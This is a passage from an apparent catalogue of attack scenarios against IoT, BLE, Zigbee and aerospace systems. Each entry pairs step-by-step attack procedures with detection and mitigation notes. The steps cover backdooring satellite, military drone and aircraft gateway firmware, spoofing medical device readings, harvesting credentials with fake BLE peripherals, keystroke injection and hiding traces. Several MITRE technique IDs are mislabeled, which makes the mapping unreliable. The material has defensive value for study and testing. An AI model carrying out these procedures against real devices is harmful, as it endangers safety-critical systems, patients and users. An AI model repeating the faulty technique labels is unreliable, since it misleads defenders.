- **Vulnerability**: SSH exists but is off by default
- **MITRE**: T1133 - External Remote Services
- **Impact**: Remote persistent access
- **Tools**: USB-TTL, vi, init scripts, BusyBox
- **Scenario**: Attacker discovers SSH is installed but disabled and enables it through UART shell for remote persistence.
- **Attack Steps**: Step 1: Connect UART and log into the BusyBox shell. Step 2: Check if sshd exists in /usr/sbin/ or /etc/init.d/. Step 3: If present but disabled, use vi to add sshd start command in /etc/init.d/rc.local. Step 4: Save changes and reboot device. Step 5: Use SSH client to access the device remotely using known credentials.
- **Detection**: Monitor for open SSH ports
- **Solution**: Use service whitelisting and port scans
- **Tags**: SSH Persistence via UART

## Satellite OTA Command Spoofing via SDR

- **Attack Type**: OTA Update Hijack (Aerospace)
- **Target**: Low Earth Orbit (LEO) Satellite
- **Vulnerability**: Unauthenticated OTA commands via RF
- **MITRE**: T1557.002, T1609
- **Impact**: Rogue OTA commands via SDR
- **Tools**: HackRF One, GNURadio, SatNOGS, Python OTA Server
- **Scenario**: Attacker uses SDR to capture and replay satellite firmware update commands from ground station uplink.
- **Attack Steps**: Step 1: Identify OTA window and uplink frequency using SatNOGS.Step 2: Use HackRF One and GNURadio to record OTA command burst.Step 3: Decode captured OTA signal format and identify update initiation packets.Step 4: Create fake firmware with altered telemetry logic.Step 5: Re-encode and transmit OTA packet via SDR replay.Step 6: Satellite processes spoofed command and installs backdoored firmware.Step 7: Confirm altered telemetry or behavioral shift in response data.Step 8: Log replay characteristics and OTA header spoofing.Step 9: Repeat with checksum-altered version to bypass basic validation.Step 10: Recommend OTA command encryption and origin verification.
- **Detection**: Ground-to-space RF logging
- **Solution**: Encrypted OTA + origin auth
- **Tags**: Satellite, SDR, RF

## Drone OTA Over Wi-Fi Injection During Maintenance

- **Attack Type**: OTA Update Hijack (Aerospace)
- **Target**: Civilian Survey Drones
- **Vulnerability**: No Wi-Fi network isolation during OTA
- **MITRE**: T1557, T1070.006
- **Impact**: Ground-level OTA compromise
- **Tools**: Wireshark, Aircrack-ng, Burp Suite, Python OTA Server
- **Scenario**: During drone maintenance, attacker joins unsecured Wi-Fi network used for OTA updates and pushes altered firmware.
- **Attack Steps**: Step 1: Identify Wi-Fi SSID and password used by technicians for drone firmware updates.Step 2: Use Aircrack-ng to crack WPA2 (if weak) or tail SSID traffic with Wireshark.Step 3: Join network and monitor OTA API calls.Step 4: Craft malicious firmware image using reverse engineering tools.Step 5: Spin up local Python HTTP Server to host firmware.Step 6: Redirect OTA endpoint using ARP spoofing or DNS spoof via Burp.Step 7: Let drone auto-fetch malicious firmware.Step 8: Observe changes in sensor response, altitude ceiling, or GPS output.Step 9: Clean traces and disconnect.Step 10: Recommend WPA3 and device-bonded OTA tokens.
- **Detection**: DNS logs, firmware hash check
- **Solution**: Secure Wi-Fi + API auth
- **Tags**: Drone OTA, WiFi Hijack

## Avionics Gateway OTA Hijack via USB Service Port

- **Attack Type**: OTA Update Hijack (Aerospace)
- **Target**: Commercial Aircraft Gateway Systems
- **Vulnerability**: USB-based OTA with no auth
- **MITRE**: T1200, T1553
- **Impact**: Physical access = OTA rootkit
- **Tools**: USB Rubber Ducky, Binwalk, Firmware Mod Kit, Ghidra
- **Scenario**: Aircraft’s onboard maintenance system accepts USB-based OTA updates. Attacker gains brief physical access and loads compromised firmware.
- **Attack Steps**: Step 1: Clone official OTA firmware package from vendor USB.Step 2: Use Ghidra and Firmware Mod Kit to embed backdoor logic (e.g., reroute nav data).Step 3: Load firmware on USB Rubber Ducky with matching labels/metadata.Step 4: During service downtime, insert USB into avionics gateway port.Step 5: Wait for device to auto-install update.Step 6: Validate altered behavior through logs or visual cockpit data.Step 7: Extract boot logs for review.Step 8: Replace firmware with clean image and remove USB.Step 9: Document vulnerability in USB-based OTA triggers.Step 10: Recommend digital signing and hardware authorization checks.
- **Detection**: Boot logs, flight data anomalies
- **Solution**: Secure USB handling, signature enforcement
- **Tags**: Aircraft, Avionics, Physical OTA

## Military UAV Satellite Relay OTA Swap

- **Attack Type**: OTA Update Hijack (Aerospace)
- **Target**: Military UAV
- **Vulnerability**: OTA relay link spoofed
- **MITRE**: T1583, T1599, T1200
- **Impact**: National defense compromise
- **Tools**: GPS-SDR-SIM, Satellite Emulator, Custom OTA Relay Server
- **Scenario**: Adversary uses captured relay station to serve spoofed OTA firmware to military drone.
- **Attack Steps**: Step 1: Identify satellite OTA relay frequency and channel structure.Step 2: Simulate GPS and SATCOM channel using GPS-SDR-SIM and a custom relay server.Step 3: Intercept OTA session during low-security window (e.g., training environment).Step 4: Inject firmware image that adds telemetry leak or logic switch.Step 5: Relay OTA through spoofed channel.Step 6: Drone downloads and installs firmware.Step 7: Monitor post-update behavior for validation.Step 8: Log telemetry encryption anomalies.Step 9: Restore firmware using secure backup chain.Step 10: Suggest PKI-signed relay verification and geo-lock.
- **Detection**: OTA audit, link geo-trace
- **Solution**: PKI enforcement, geo-fencing OTA
- **Tags**: SATCOM, Military, Relay Exploit

## CubeSat OTA Hijack via Faulty CRC Check

- **Attack Type**: OTA Update Hijack (Aerospace)
- **Target**: CubeSat / Academic Nanosats
- **Vulnerability**: Weak checksum validation
- **MITRE**: T1609, T1496
- **Impact**: CRC collision hijacks update
- **Tools**: CRC Collision Generator, Binwalk, SDR, SatNOGS
- **Scenario**: CubeSat uses basic CRC for OTA verification. Attacker exploits CRC collision to push rogue firmware.
- **Attack Steps**: Step 1: Download or reverse CubeSat firmware via SatNOGS ground station.Step 2: Modify payload with logging or C2 logic.Step 3: Generate CRC-corrected binary using custom CRC collision tools.Step 4: Transmit OTA signal via SDR targeting CubeSat pass window.Step 5: CubeSat accepts firmware due to CRC match.Step 6: Confirm payload activates (e.g., beacon deviation, new telemetry frame).Step 7: Compare firmware logs and CRC validity.Step 8: Rotate transmission keys post-experiment.Step 9: Patch CubeSat bootloader with SHA-based checks.Step 10: Train ops team on CRC weakness.
- **Detection**: CRC match logs, boot scan
- **Solution**: Enforce SHA256 + sig validation
- **Tags**: CubeSat, Checksum Exploit

## BLE Passive Sniffing Attack

- **Attack Type**: BLE Protocol Sniffing
- **Target**: Wearable Device
- **Vulnerability**: Unencrypted BLE traffic
- **MITRE**: T1421 - Capture Sensor Data
- **Impact**: Privacy Leakage
- **Tools**: Hardware: Ubertooth OneSoftware: Wireshark + BLE Plugin
- **Scenario**: An attacker listens to unencrypted BLE communication between a fitness tracker and a mobile app.
- **Attack Steps**: Step 1: Set up the Ubertooth One and connect it to your computer.Step 2: Install Wireshark and enable BLE plugin support.Step 3: Place the device near the BLE communication (e.g., 1-2 meters from the fitness tracker).Step 4: Start the sniffer in Ubertooth and monitor traffic in Wireshark.Step 5: Filter BLE packets and analyze the unencrypted attributes (e.g., heart rate, steps).Step 6: Save the packet capture for review.Step 7: Demonstrate privacy leakage due to lack of encryption.
- **Detection**: BLE packet sniffer, anomaly in device data stream
- **Solution**: Enforce BLE Secure Connections (LESC)
- **Tags**: BLE, Sniffing, Ubertooth, Fitness

## BLE Replay Attack on Smart Lock

- **Attack Type**: BLE Replay Attack
- **Target**: Smart Lock
- **Vulnerability**: Lack of BLE authentication & replay protection
- **MITRE**: T1040 - Network Sniffing
- **Impact**: Unauthorized Access
- **Tools**: Hardware: HackRF One / Ubertooth OneSoftware: Gattacker, BLEAH
- **Scenario**: Replay the BLE unlock command captured from a smartphone to open a BLE-enabled smart lock.
- **Attack Steps**: Step 1: Use Ubertooth or HackRF to capture BLE unlock command during normal use.Step 2: Save the captured GATT write packet.Step 3: Move out of range and try to replay the same packet using Gattacker.Step 4: Observe the smart lock unlocking without authentication.Step 5: Repeat attack to show the vulnerability.Step 6: Demonstrate that the lock lacks session token or rolling code.Step 7: Discuss implications for physical security.
- **Detection**: Log file anomalies, multiple unlock events
- **Solution**: Use BLE bonding + session nonce
- **Tags**: Replay, BLE, Gattacker, Physical Access

## Zigbee Key Extraction via Sniffing

- **Attack Type**: Zigbee Key Extraction
- **Target**: Smart Bulbs / Home Automation Hub
- **Vulnerability**: Insecure Key Exchange
- **MITRE**: T1557 - Man-in-the-Middle
- **Impact**: Unauthorized Device Control
- **Tools**: Hardware: CC2531 USB DongleSoftware: KillerBee Toolkit
- **Scenario**: Intercept Zigbee network key during the device joining phase in a smart lighting system.
- **Attack Steps**: Step 1: Flash the CC2531 dongle with sniffer firmware.Step 2: Plug the dongle into a Linux machine and install KillerBee.Step 3: Use zbdump to monitor Zigbee traffic during new device pairing.Step 4: Wait for a new device to join (or force a rejoin).Step 5: Capture network key transmitted in plaintext.Step 6: Use zbkeys to extract and decode the key.Step 7: Reuse the key to impersonate the legitimate device.
- **Detection**: Zigbee traffic spike during pairing
- **Solution**: Use install code-based secure joining
- **Tags**: Zigbee, Key Leak, KillerBee, CC2531

## Zigbee Beacon Flooding (DoS)

- **Attack Type**: Zigbee Beacon Flooding
- **Target**: Zigbee Mesh Devices
- **Vulnerability**: Lack of beacon filtering
- **MITRE**: T1499 - Endpoint Denial of Service
- **Impact**: Zigbee Device Unavailability
- **Tools**: Hardware: CC2531Software: KillerBee, zb-flood.py
- **Scenario**: An attacker floods Zigbee channels with fake beacon frames to confuse nearby devices and cause disconnections.
- **Attack Steps**: Step 1: Connect CC2531 sniffer with KillerBee on a Linux system.Step 2: Scan the Zigbee channel used by the target network using zbstumbler.Step 3: Run the zb-flood.py script to send hundreds of fake beacon frames.Step 4: Observe the instability in the Zigbee mesh (lights drop connection, delays).Step 5: Monitor logs on the hub (if accessible) to show packet loss.Step 6: Document DoS effect by trying to operate devices.Step 7: Discuss need for whitelist and RF filtering.
- **Detection**: Packet loss & high beacon count in logs
- **Solution**: RF filtering, MAC-level access control
- **Tags**: Zigbee, DoS, Beacon Flood

## BLE Device Spoofing via GATT Impersonation

- **Attack Type**: BLE Spoofing
- **Target**: Medical BLE Device
- **Vulnerability**: Lack of BLE origin verification
- **MITRE**: T1583.006 - Compromise BLE Device Identity
- **Impact**: Health Risk / Data Integrity
- **Tools**: Software: BlueZ stack + gatt-server (Linux), NRF Connect
- **Scenario**: Create a fake BLE device that impersonates a glucose monitor to fool a mobile health app.
- **Attack Steps**: Step 1: On a Linux machine with Bluetooth adapter, install BlueZ stack.Step 2: Use gatt-server to create a custom GATT profile that mimics a glucose monitor.Step 3: Assign the same UUIDs and services as the real monitor.Step 4: Advertise the spoofed device with the same name.Step 5: On the victim's phone, open the health app and let it connect to the fake device.Step 6: Send fake glucose values to the app.Step 7: Log and demonstrate how spoofed values could mislead treatment.
- **Detection**: Unexpected device UUIDs or GATT changes
- **Solution**: Use device whitelisting + signature verification
- **Tags**: BLE, Medical, Spoof, Health Risk

## BLE GATT Enumeration via BLEAH

- **Attack Type**: BLE Reconnaissance
- **Target**: BLE-enabled Device
- **Vulnerability**: Exposed GATT characteristics
- **MITRE**: T1595 - Active Scanning
- **Impact**: Information Leakage
- **Tools**: See tools table below
- **Scenario**: Attacker scans and maps BLE services on a nearby smart device using passive enumeration.
- **Attack Steps**: Step 1: Install BLEAH on a Linux system with a Bluetooth adapter.Step 2: Use bleah -t <MAC> to connect to the BLE device.Step 3: Passively scan for readable GATT services and characteristics.Step 4: Identify sensitive services (e.g., device name, battery, or health data).Step 5: Note which services require no authentication.Step 6: Log all UUIDs and readable properties.Step 7: Demonstrate potential for data harvesting or further attacks.
- **Detection**: Unexpected GATT queries
- **Solution**: Restrict read access via BLE permissions
- **Tags**: Reconnaissance, BLEAH, BLE, Privacy

## Zigbee Router Injection

- **Attack Type**: Zigbee Mesh Manipulation
- **Target**: Zigbee Smart Mesh
- **Vulnerability**: Mesh routing trust model
- **MITRE**: T1557.003 - Rogue Wireless Device
- **Impact**: Data Interception
- **Tools**: See tools table below
- **Scenario**: Attacker joins a rogue router node to manipulate routing in the mesh network.
- **Attack Steps**: Step 1: Flash CC2531 with router firmware using TI tools.Step 2: Configure the rogue device to mimic a Zigbee router.Step 3: Join the Zigbee mesh with a low-power radio signal.Step 4: Wait for mesh clients to reroute through your rogue router.Step 5: Observe or modify packets relayed through your node.Step 6: Capture logs using KillerBee tools.Step 7: Discuss implications for packet tampering and redirection.
- **Detection**: Topology changes in Zigbee map
- **Solution**: Use device whitelists and mesh authentication
- **Tags**: Zigbee, Rogue Node, Routing, Mesh

## BLE MITM Attack via BtleJuice

- **Attack Type**: BLE Man-in-the-Middle
- **Target**: BLE Wearable + Mobile App
- **Vulnerability**: Lack of BLE mutual authentication
- **MITRE**: T1557.001 - Man-in-the-Middle
- **Impact**: Data Tampering
- **Tools**: See tools table below
- **Scenario**: Simulate MITM attack between BLE fitness tracker and its mobile app.
- **Attack Steps**: Step 1: Use two BLE adapters: one connects to the tracker, one to the app.Step 2: Install and run BtleJuice on a Linux system.Step 3: Launch the web UI and configure the proxy session.Step 4: Connect to the app via proxy instead of directly.Step 5: Intercept and modify heart rate or fitness data.Step 6: Observe effect on mobile app or health log.Step 7: Demonstrate absence of secure pairing or integrity checks.
- **Detection**: Proxy-based anomalies
- **Solution**: Use BLE Secure Connections (LESC)
- **Tags**: BLE, MITM, BtleJuice, Health

## Zigbee Unauthorized Binding

- **Attack Type**: Zigbee Device Hijack
- **Target**: Zigbee Light Bulb
- **Vulnerability**: Unauthenticated binding
- **MITRE**: T1583.006 - Device Hijack
- **Impact**: Device Takeover
- **Tools**: See tools table below
- **Scenario**: Attacker binds a Zigbee remote to a victim’s bulb without proper permissions.
- **Attack Steps**: Step 1: Use zbassocflood tool from KillerBee to flood with association requests.Step 2: Attempt to send a bind command from a rogue controller.Step 3: Wait for the target device (bulb) to acknowledge.Step 4: Now control the bulb using attacker’s remote.Step 5: Demonstrate flashing, power control, or toggling.Step 6: Show lack of proper authorization in the hub.Step 7: Log attack with traffic analyzer.
- **Detection**: Unexpected controller behavior
- **Solution**: Use secure binding + install code
- **Tags**: Zigbee, Hijack, Smart Bulb

## BLE Null Encryption Downgrade

- **Attack Type**: Encryption Downgrade
- **Target**: BLE Device (e.g., speaker)
- **Vulnerability**: Lack of encryption enforcement
- **MITRE**: T1600 - Modify System Auth
- **Impact**: Eavesdropping
- **Tools**: See tools table below
- **Scenario**: BLE attacker forces connection to use unencrypted communication.
- **Attack Steps**: Step 1: Use BtleJuice or custom HCI intercept tool.Step 2: Intercept the pairing request from mobile to BLE device.Step 3: Force pairing mode to “Just Works” (unauthenticated).Step 4: Let pairing complete with null encryption.Step 5: Sniff communication using Wireshark or BLEAH.Step 6: Demonstrate readable plaintext messages.Step 7: Discuss why stronger pairing modes matter.
- **Detection**: BLE packets in plaintext
- **Solution**: Enforce authenticated pairing
- **Tags**: BLE, Downgrade, Null Encryption

## Zigbee Over-the-Air Command Injection

- **Attack Type**: OTA Command Injection
- **Target**: Zigbee Switch / Relay
- **Vulnerability**: Insecure OTA Cluster Commands
- **MITRE**: T1546.003 - Command Injection
- **Impact**: Unintended Behavior
- **Tools**: See tools table below
- **Scenario**: Attacker sends Zigbee ZCL (Cluster) commands to change device behavior.
- **Attack Steps**: Step 1: Use zbreplay from KillerBee to record legitimate ZCL commands.Step 2: Modify replay file to send unexpected command (e.g., toggle relay).Step 3: Inject the packet during mesh communication.Step 4: Observe device behavior changes (e.g., switch toggling).Step 5: Log the event using packet captures.Step 6: Discuss lack of command signing or authentication.Step 7: Provide mitigation using secured OTA updates.
- **Detection**: Unexpected cluster commands
- **Solution**: Enforce signed ZCL commands
- **Tags**: Zigbee, OTA, Command Injection

## BLE Attribute Spoofing

- **Attack Type**: Attribute Tampering
- **Target**: BLE Thermostat
- **Vulnerability**: Insecure GATT service verification
- **MITRE**: T1565 - Data Manipulation
- **Impact**: System Disruption
- **Tools**: See tools table below
- **Scenario**: Attacker spoofs temperature data to a BLE thermostat device.
- **Attack Steps**: Step 1: Setup a BLE server using gatt-server with temperature UUIDs.Step 2: Advertise the spoofed BLE server with the same name as original.Step 3: Let the mobile app connect and fetch temperature readings.Step 4: Inject manipulated readings like 45°C or -10°C.Step 5: Observe thermostat response (e.g., AC activation).Step 6: Log changes in the app’s interface.Step 7: Discuss the risk of automated system responses to fake inputs.
- **Detection**: Sudden input deviation logs
- **Solution**: Authenticate BLE services and UUIDs
- **Tags**: BLE, Attribute Spoofing, Thermostat

## Zigbee Touchlink Hijack

- **Attack Type**: Touchlink Exploit
- **Target**: Zigbee Bulb
- **Vulnerability**: Touchlink proximity exploit
- **MITRE**: T1210 - Exploit Proximity Features
- **Impact**: Unauthorized Access
- **Tools**: See tools table below
- **Scenario**: Attack using Zigbee Touchlink feature to hijack bulbs without the network key.
- **Attack Steps**: Step 1: Bring attacker device (e.g., Zigbee remote) close to the bulb.Step 2: Use Touchlink command to initiate pairing.Step 3: Bulb accepts pairing, no authentication needed.Step 4: Attacker controls light directly.Step 5: Show light flashing or toggling with attacker’s remote.Step 6: Note that no hub involvement is needed.Step 7: Demonstrate problem of proximity-based unsecure pairing.
- **Detection**: Light toggling logs
- **Solution**: Disable Touchlink or restrict physically
- **Tags**: Zigbee, Touchlink, Light Hijack

## BLE Impersonation via Cloned MAC

- **Attack Type**: MAC Spoofing
- **Target**: BLE Medical Device
- **Vulnerability**: MAC address spoofing
- **MITRE**: T1583.006 - Device Impersonation
- **Impact**: Misleading Medical Data
- **Tools**: See tools table below
- **Scenario**: Attacker changes their BLE device MAC to match a known trusted MAC.
- **Attack Steps**: Step 1: Use hciconfig to spoof attacker’s BLE MAC address.Step 2: Set same name and UUIDs as target device (e.g., glucose monitor).Step 3: When mobile app scans, spoofed device appears legitimate.Step 4: App connects and receives spoofed data.Step 5: Send malformed health stats.Step 6: Observe app accepting fake stats.Step 7: Explain importance of MAC whitelisting and device identity.
- **Detection**: Health anomaly alerts
- **Solution**: Use device fingerprinting
- **Tags**: BLE, MAC Spoofing, Medical

## Zigbee Broadcast Storm

- **Attack Type**: DoS via Broadcast
- **Target**: Zigbee Mesh Network
- **Vulnerability**: Lack of broadcast rate limiting
- **MITRE**: T1499.001 - Network DoS
- **Impact**: Device Unavailability
- **Tools**: See tools table below
- **Scenario**: Flood Zigbee network with broadcast frames to create mesh congestion.
- **Attack Steps**: Step 1: Use KillerBee’s zbflood tool with CC2531.Step 2: Configure it to send continuous broadcast messages.Step 3: Start transmission near Zigbee hub.Step 4: Observe slowing or dropping of device responses.Step 5: Log device behavior or connectivity losses.Step 6: Stop broadcast to show normal operation returning.Step 7: Discuss risks of unfiltered broadcast messages.
- **Detection**: Zigbee packet storm detected
- **Solution**: Implement rate limits at hub level
- **Tags**: Zigbee, Broadcast, DoS, Mesh

## BLE DoS via Connection Flood

- **Attack Type**: BLE Denial of Service
- **Target**: BLE Peripheral (e.g., Smart Band)
- **Vulnerability**: No connection throttle mechanism
- **MITRE**: T1499 - Endpoint DoS
- **Impact**: Device crash or freeze
- **Tools**: gattacker, Linux BLE Adapter
- **Scenario**: Overload a BLE peripheral by repeatedly initiating and dropping connection requests.
- **Attack Steps**: Step 1: Install gattacker on a Linux system with BLE adapter.Step 2: Set up a script to scan for the BLE device repeatedly.Step 3: Send continuous connection requests and immediately disconnect.Step 4: Monitor BLE device to see slowdowns or disconnections.Step 5: Observe that the device stops accepting legitimate connections.Step 6: Log dropped packets and failed connects.Step 7: Discuss lack of rate limiting or connection queue defense.
- **Detection**: Log of failed connections
- **Solution**: Implement connection rate limits
- **Tags**: BLE, DoS, Flood

## Zigbee Beacon Spoofing for Rogue Network

- **Attack Type**: Beacon Spoofing
- **Target**: Zigbee Smart Devices
- **Vulnerability**: Zigbee network trust assumptions
- **MITRE**: T1557 - Rogue Infrastructure
- **Impact**: Network Isolation
- **Tools**: CC2531, KillerBee
- **Scenario**: Fake Zigbee network advertised to lure devices to join rogue mesh.
- **Attack Steps**: Step 1: Flash CC2531 with sniffer firmware.Step 2: Use zbdump and zbopen from KillerBee to spoof a new coordinator.Step 3: Create a fake Zigbee beacon with network parameters similar to real one.Step 4: Broadcast this beacon near victim devices.Step 5: Observe whether victim joins rogue mesh.Step 6: Log joining activity and traffic diversion.Step 7: Demonstrate ability to mislead or isolate devices.
- **Detection**: Beacon changes in logs
- **Solution**: Beacon authentication, install codes
- **Tags**: Zigbee, Spoofing, Rogue Network

## BLE Sniffing with SDR (HackRF)

- **Attack Type**: BLE Passive Recon
- **Target**: Any BLE Device
- **Vulnerability**: BLE advertisement leakage
- **MITRE**: T1421 - Capture Sensor Data
- **Impact**: Metadata Leakage
- **Tools**: HackRF One, GQRX, Wireshark
- **Scenario**: Using HackRF to capture BLE advertisement and connection packets.
- **Attack Steps**: Step 1: Set up HackRF and install GQRX or SDR# to monitor 2.4 GHz band.Step 2: Use BLE-specific GNU Radio blocks to demodulate BLE signals.Step 3: Capture advertising packets and connection requests.Step 4: Decode with Wireshark BLE plugin.Step 5: Identify device MACs, services, and connection intervals.Step 6: Save traffic for later analysis.Step 7: Discuss BLE frequency hopping and limitations.
- **Detection**: RF capture logs
- **Solution**: Use BLE MAC randomization
- **Tags**: BLE, HackRF, SDR

## Zigbee Replay Attack on Smart Switch

- **Attack Type**: Command Replay
- **Target**: Zigbee Smart Switch
- **Vulnerability**: No replay protection
- **MITRE**: T1071 - Application Protocol Abuse
- **Impact**: Unauthorized Control
- **Tools**: CC2531, KillerBee (zbdump, zbreplay)
- **Scenario**: Replay previously captured ON/OFF Zigbee packets to toggle devices.
- **Attack Steps**: Step 1: Use CC2531 with zbdump to capture Zigbee packets from a smart switch.Step 2: Identify ON/OFF command packets.Step 3: Use zbreplay to replay the captured packets.Step 4: Observe the light or device toggling.Step 5: Repeat to show replayability without challenge-response.Step 6: Demonstrate lack of rolling code or packet freshness.Step 7: Recommend implementation of secure frame counters.
- **Detection**: Repeated toggling logs
- **Solution**: Use Zigbee frame counters & message integrity
- **Tags**: Zigbee, Replay, Light Switch

## BLE Fake Peripheral for Phishing

- **Attack Type**: BLE-based Phishing
- **Target**: BLE-enabled Smartphone
- **Vulnerability**: Lack of BLE authentication
- **MITRE**: T1566 - Phishing over BLE
- **Impact**: User Credential Theft
- **Tools**: Raspberry Pi with BLE, bluez, gatt-server
- **Scenario**: Set up a BLE peripheral that mimics a legitimate device to trick users into giving data.
- **Attack Steps**: Step 1: Set up Raspberry Pi with Bluetooth and install BlueZ.Step 2: Create a custom GATT profile mimicking a real product (e.g., fitness tracker).Step 3: Advertise same device name and services.Step 4: User connects via official mobile app, believing it's genuine.Step 5: Prompt user to enter data (e.g., setup PIN, email).Step 6: Capture entered info.Step 7: Log result and discuss BLE trust issues.
- **Detection**: Unexpected device prompts
- **Solution**: Validate device fingerprint
- **Tags**: BLE, Phishing, GATT, Spoof

## Zigbee Frame Counter Bypass

- **Attack Type**: Replay with Counter Reset
- **Target**: Zigbee Smart Devices
- **Vulnerability**: Improper counter validation
- **MITRE**: T1203 - Exploitation for Execution
- **Impact**: Persistent Replay Exploit
- **Tools**: CC2531, zbreplay, modified replay script
- **Scenario**: Attack targets devices with improperly implemented Zigbee frame counters.
- **Attack Steps**: Step 1: Capture a Zigbee packet with low frame counter using zbdump.Step 2: Modify replay tool to reset frame counter to same or lower value.Step 3: Replay the packet multiple times.Step 4: Target device accepts replayed packet, responding each time.Step 5: Observe device acting on repeated commands.Step 6: Log traffic behavior and impact.Step 7: Recommend proper counter checking at device level.
- **Detection**: Repeated commands from old frames
- **Solution**: Enforce strict frame counter logic
- **Tags**: Zigbee, Frame Counter, Replay

## BLE GATT Overwrite Attack

- **Attack Type**: Unauthorized Attribute Write
- **Target**: BLE Smartwatch or Toy
- **Vulnerability**: No write protection on GATT attributes
- **MITRE**: T1565.001 - Stored Data Manipulation
- **Impact**: Display of False Data
- **Tools**: bleah, gattacker, Linux BLE adapter
- **Scenario**: Attacker writes fake values to GATT attributes without authorization.
- **Attack Steps**: Step 1: Connect to the BLE device using bleah -t <MAC>.Step 2: List all writable characteristics.Step 3: Identify unprotected writable attributes.Step 4: Use gattacker to send custom values (e.g., fake battery = 1%).Step 5: Observe mobile app displaying incorrect info.Step 6: Log BLE writes and device logs.Step 7: Explain role of permissions and authentication.
- **Detection**: Unexpected attribute values
- **Solution**: Secure write characteristics
- **Tags**: BLE, GATT Write, Fake Data

## Zigbee MAC Spoofing Attack

- **Attack Type**: MAC Spoofing
- **Target**: Zigbee Smart Hub
- **Vulnerability**: MAC address spoofing allowed
- **MITRE**: T1557.003 - Network Device Impersonation
- **Impact**: Network Instability
- **Tools**: CC2531, Zigbee firmware tools
- **Scenario**: Attacker spoofs MAC of a trusted Zigbee device to confuse the network.
- **Attack Steps**: Step 1: Identify MAC address of trusted Zigbee device from traffic logs.Step 2: Configure rogue Zigbee node with same MAC.Step 3: Join the network and send packets using spoofed MAC.Step 4: Monitor hub and observe duplicated node behavior.Step 5: See device flapping or packet collision.Step 6: Log hub confusion or failovers.Step 7: Recommend unique ID and MAC filtering.
- **Detection**: MAC conflict in Zigbee logs
- **Solution**: MAC filtering and trust anchors
- **Tags**: Zigbee, MAC Spoof, Impersonation

## BLE Keyboard Injection (HID Spoofing)

- **Attack Type**: HID Spoofing
- **Target**: BLE-enabled Laptop
- **Vulnerability**: Lack of trusted HID pairing policy
- **MITRE**: T1056.001 - Input Capture
- **Impact**: Remote Code Execution
- **Tools**: Raspberry Pi + BLE Dongle + bluez
- **Scenario**: Attacker emulates a BLE keyboard to send keystrokes to a victim’s computer.
- **Attack Steps**: Step 1: Set up Raspberry Pi with BLE and install BlueZ stack.Step 2: Configure as HID keyboard profile.Step 3: Advertise as “Bluetooth Keyboard”.Step 4: Victim pairs via OS Bluetooth menu.Step 5: Inject malicious keystrokes (e.g., open terminal, download file).Step 6: Log victim response.Step 7: Discuss BLE HID risks and trusted device list enforcement.
- **Detection**: Unusual HID events
- **Solution**: Whitelist trusted HID devices only
- **Tags**: BLE, HID, Keystroke Injection

## Zigbee Device Rejoin Attack

- **Attack Type**: Forced Rejoin
- **Target**: Zigbee Sensor or Light
- **Vulnerability**: No join control or rate limit
- **MITRE**: T1499 - Endpoint Denial of Service
- **Impact**: Device Instability
- **Tools**: CC2531, zbassocflood, zbstumbler
- **Scenario**: Attacker forces Zigbee device to leave and rejoin, causing instability.
- **Attack Steps**: Step 1: Use zbassocflood to send association overload packets.Step 2: Device leaves the mesh due to timeout.Step 3: Rejoins network and loses previous state.Step 4: Repeat rejoin trigger to cause denial-of-service.Step 5: Log mesh reset events and loss of automation routines.Step 6: Show device blinking or resyncing.Step 7: Recommend join rate limiting and association controls.
- **Detection**: Rejoin spike in logs
- **Solution**: Limit rejoin attempts per device
- **Tags**: Zigbee, DoS, Rejoin Flood

## BLE Connection Parameter Attack

- **Attack Type**: Link-Layer Manipulation
- **Target**: BLE Smartwatch
- **Vulnerability**: Lack of validation on link parameters
- **MITRE**: T1499.004 - Resource Exhaustion
- **Impact**: Battery Drain / Delay
- **Tools**: Linux with BlueZ, hcitool, btmgmt
- **Scenario**: Attacker manipulates BLE connection parameters to reduce responsiveness and drain battery.
- **Attack Steps**: Step 1: Use hcitool to discover nearby BLE devices.Step 2: Initiate a connection using manipulated parameters (e.g., high latency, long interval).Step 3: Use btmgmt to force BLE to accept these parameters.Step 4: Monitor the connected BLE device becoming sluggish.Step 5: Check logs or battery consumption on the device.Step 6: Repeat with multiple intervals to study performance.Step 7: Discuss vulnerability of connection configuration abuse.
- **Detection**: Battery drop in short time
- **Solution**: Limit connection parameter range
- **Tags**: BLE, DoS, Latency, Battery

## Zigbee Unauthorized OTA Firmware Push

- **Attack Type**: Firmware Attack
- **Target**: Zigbee Smart Plug / Bulb
- **Vulnerability**: No firmware signature enforcement
- **MITRE**: T1542.001 - Boot or Firmware Modification
- **Impact**: Device Takeover
- **Tools**: CC2531, KillerBee, Custom OTA Payload
- **Scenario**: Attacker pushes malicious Zigbee firmware updates to devices without verification.
- **Attack Steps**: Step 1: Extract a legitimate OTA firmware from a Zigbee device.Step 2: Modify firmware binary (e.g., change LED behavior or disable radio).Step 3: Use KillerBee’s OTA broadcast tool to send update to target.Step 4: Device accepts and installs unsigned update.Step 5: Observe behavior change (e.g., LED blinking erratically).Step 6: Log update activity and side effects.Step 7: Discuss need for firmware signature validation.
- **Detection**: Unexpected device behavior post-OTA
- **Solution**: Sign and verify firmware before flashing
- **Tags**: Zigbee, OTA, Firmware Attack

## BLE Pairing Spoof via Name Cloning

- **Attack Type**: Identity Impersonation
- **Target**: BLE Thermometer / Sensor
- **Vulnerability**: BLE pairing name ambiguity
- **MITRE**: T1583.006 - Device Impersonation
- **Impact**: Trust Misplacement
- **Tools**: Raspberry Pi, BlueZ, bluetoothctl
- **Scenario**: Attacker advertises a cloned device name to confuse users during pairing.
- **Attack Steps**: Step 1: Configure attacker device to use same name as target (e.g., “ThermoSensor”).Step 2: Use bluetoothctl or hciconfig to set alias.Step 3: Broadcast device using the same GATT profile.Step 4: Victim attempts to pair and selects spoofed name.Step 5: Attacker gains connection and sends fake data.Step 6: Log victim behavior and connection logs.Step 7: Emphasize UI ambiguity in Bluetooth pairing.
- **Detection**: Duplicate device name in scan list
- **Solution**: Use full UUID-based identity check
- **Tags**: BLE, Spoofing, Pairing Attack

## Zigbee Trust Center Impersonation

- **Attack Type**: Coordinator Spoof
- **Target**: Zigbee Mesh Network
- **Vulnerability**: No secure Trust Center validation
- **MITRE**: T1584 - Compromise Infrastructure
- **Impact**: Full Mesh Hijack
- **Tools**: CC2531, Custom Coordinator Firmware
- **Scenario**: Attacker pretends to be Zigbee Trust Center to manage key distribution.
- **Attack Steps**: Step 1: Configure attacker node as Zigbee coordinator using custom firmware.Step 2: Broadcast Trust Center beacons with same PAN ID.Step 3: Wait for devices to reset or restart and attempt rejoin.Step 4: Devices pair with attacker thinking it's the original Trust Center.Step 5: Attacker now manages keys and device access.Step 6: Demonstrate key distribution or denial.Step 7: Discuss use of install codes and signed Trust Center IDs.
